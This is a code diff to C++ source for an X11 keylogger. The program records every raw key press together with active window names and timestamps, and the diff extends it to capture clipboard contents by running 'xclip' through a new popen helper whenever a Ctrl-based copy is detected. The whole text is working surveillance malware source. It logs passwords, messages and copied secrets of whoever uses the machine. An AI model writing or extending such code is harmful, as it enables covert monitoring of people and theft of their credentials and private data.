@@ -7,11 +7,32 @@
 #include <fstream>
 #include <cstring> 
 #include <ctime>
+#include <memory>
+#include <array>
+#include <functional>
 
 #include "utils/cyrillicHelper/cyrillicHelper.hpp"
 #include "utils/specialKeysHelper/specialKeysHelper.hpp"
 #include "utils/keyPressHelper/keyPressHelper.hpp"
 #include "utils/processTrackingHelper/processTracking.hpp"
+
+
+std::string exec(const char* cmd) {
+    std::array<char, 128> buffer;
+    std::string result;
+    
+    std::function<int(FILE*)> deleter = pclose; 
+    
+    std::unique_ptr<FILE, std::function<int(FILE*)>> pipe(popen(cmd, "r"), deleter);
+    
+    if (!pipe) {
+        throw std::runtime_error("popen() failed!");
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    return result;
+}
 
 std::string getCurrentTimestamp() {
     time_t now = time(0);
@@ -45,6 +66,7 @@ void trim_leading_newlines(std::string& s) {
 }
 
 int main() {
+  
     Display* display = XOpenDisplay(NULL);
     if (!display) {
         std::cerr << "Не удалось подключиться к X-серверу." << std::endl;
@@ -78,6 +100,7 @@ int main() {
     XkbStateRec state;
     XEvent xevent;
     std::string windowName;
+    bool ctrlPressed = false;
 
     while (true) {
         XkbGetState(display, XkbUseCoreKbd, &state);
@@ -89,19 +112,24 @@ int main() {
             log_buffer += "\n\n\n" + getCurrentTimestamp() + " - [Active Window: " + windowName + "]\n\n"; 
         }
         
-        
         if (xevent.xcookie.type == GenericEvent && xevent.xcookie.extension == xi_opcode) {
             XGetEventData(display, &xevent.xcookie);
 
             if (xevent.xcookie.evtype == XI_RawKeyPress) {
                 XIRawEvent* rawev = (XIRawEvent*)xevent.xcookie.data;
                 
-                KeyPressResult result = process_key_press(display, rawev, state);
+                KeyPressResult result = process_key_press(display, rawev, state, ctrlPressed);
 
                 if (result.should_exit) {
                     std::cout << "Нажата клавиша: " << result.printable_name << std::endl;
                     XFreeEventData(display, &xevent.xcookie);
                     break;
+                }
+
+                if (result.should_grabBuffer) {
+                    std::string clipboard_text = exec("xclip -selection clipboard -o");
+                    log_buffer += "\n\n" + getCurrentTimestamp() + " - Copied:[\n" + clipboard_text + "\n]\n";
+                    continue;
                 }
 
                 // if (result.printable_name) {
